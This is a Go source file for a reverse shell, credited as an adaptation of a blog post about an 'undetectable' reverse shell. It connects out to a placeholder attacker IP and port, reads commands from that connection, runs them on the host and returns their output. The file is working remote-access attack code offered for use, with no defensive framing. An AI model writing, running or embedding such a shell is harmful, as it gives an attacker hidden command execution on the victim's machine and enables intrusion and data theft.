// Simple Golang Reverse Shell
// Adaptation of https://medium.com/@sathish__kumar/undetectable-reverse-shell-with-golang-4fd4b1e172c1
// This version takes commands with parameters into account
package main

import (
    "bufio"
    "fmt"
    "os/exec"
    "net"
    "strings"
)

type error interface {
    Error() string
}

func main(){
	// connect to listener
	conn, err := net.Dial("tcp", "<IP>:<PORT>")
	if err != nil {
		fmt.Println(err.Error())
	}

	fmt.Fprintf(conn,"Enter Commands or type 'Exit':\n")
	for {
		// read in input from stdin
		fmt.Fprintf(conn,"--> ")
		text, _ := bufio.NewReader(conn).ReadString('\n')
		// send to socket
		if strings.TrimSpace(string(text)) == "Exit" {
                        fmt.Fprintf(conn,"TCP client exiting...\n\n")
                        return
	    	}
		// else, split into args and execute commands
		args := strings.Fields(text)
		out, err := exec.Command(args[0], args[1:]...).Output()
		if err != nil{
			fmt.Fprintf(conn,err.Error())
		}
		fmt.Fprintf(conn, "%s\n", out)
	}
}
